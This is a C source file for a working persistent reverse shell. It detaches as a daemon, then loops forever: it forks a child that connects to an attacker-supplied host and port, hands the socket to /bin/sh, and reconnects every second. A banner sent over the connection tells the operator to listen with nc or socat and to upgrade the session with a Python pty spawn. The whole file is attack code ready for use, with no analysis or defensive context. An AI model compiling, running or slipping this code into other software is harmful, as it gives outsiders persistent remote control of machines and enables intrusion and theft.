#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

void usage();
void reverse_shell(const char* host, unsigned short port);
const char shell[] = "/bin/sh";
const char message[] = "Successfully reversed!\n\tIf you want a readline function, please exit then run:\nrlwrap nc -lvvp <port>\n\tor:\nsocat readline,history=$HOME/.socat.hist exec:'nc -lvvp <port>'\n\tIf you want to use a bash, please run:\npython -c \"__import__('pty').spawn('/bin/bash')\"\n";

int main(int argc, char *argv[]) {
    if(argc != 3) {
        usage(argv[0]);
    }
    int ret = daemon(1, 1);
    if (ret < 0) {
        fprintf(stderr, "Cannot enter daemon mode!\n");
        exit(ret);
    }
    const char* host = argv[1];
    unsigned short port = (unsigned short)strtol(argv[2], NULL, 10);

    while (1) {
        // pid_t parent = getpid();
        pid_t pid = fork();

        if (pid < 0) {
            fprintf(stderr, "Cannot fork!\n");
            exit(pid);
        } else if (pid > 0) {
            // parent process
            int status;
            waitpid(pid, &status, 0);
        } else {
            // child process
            reverse_shell(host, port);
            _exit(EXIT_FAILURE);   // exec never returns
        }
        sleep(1);
    }
    return 0;
}

void reverse_shell(const char* host, unsigned short port) {
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        fprintf(stderr, "Cannot make socket!");
        exit(sock);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    int ret = connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr));
    if(ret < 0) {
        fprintf(stderr, "Cannot connect to %s:%d!\n", host, port);
        exit(ret);
    }

    send(sock, message, sizeof(message), 0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell, shell, NULL);
    close(sock);
}

void usage(const char* prog) {
    fprintf(stdout, "Usage: %s <reverse host> <port>\n", prog);
    exit(-1);
}
